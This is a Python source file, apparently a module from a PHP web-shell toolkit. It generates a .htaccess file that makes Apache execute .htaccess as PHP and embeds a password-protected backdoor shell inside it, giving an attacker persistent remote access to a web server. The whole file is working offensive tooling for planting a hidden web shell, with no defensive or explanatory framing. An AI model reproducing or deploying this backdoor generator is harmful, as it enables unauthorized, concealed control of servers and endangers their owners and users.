from core.parameters import ParametersList, Parameter as P
from core.module import Module, ModuleException
from core.backdoor import Backdoor

classname = 'Htaccess'

class Htaccess(Module):

    htaccess_template = '''
<Files ~ "^\.ht">
    Order allow,deny
    Allow from all
</Files>

AddType application/x-httpd-php .htaccess
# %%%PHPSHELL%%% #
'''


    params = ParametersList('Create backdoor in .htaccess file (needs remote AllowOverride)', [],
                        P(arg='path', help='Path', default='.htaccess', pos=0))


    def __init__( self, modhandler , url, password):
        """ Avoid to load default interpreter """
        self.backdoor = Backdoor(password)
        self.modhandler = modhandler
        self.modhandler.interpreter = True
        self.password = password
        self.name = self.__module__[8:]


    def run_module( self, filename ):
        out = file( filename, 'wt' )
        out.write( self.htaccess_template.replace('%%%PHPSHELL%%%', str(self.backdoor).replace('\n',' ') ))
        out.close()

        self.mprint("[%s] Backdoor file '%s' created with password '%s'." % ( self.name, filename, self.password ))
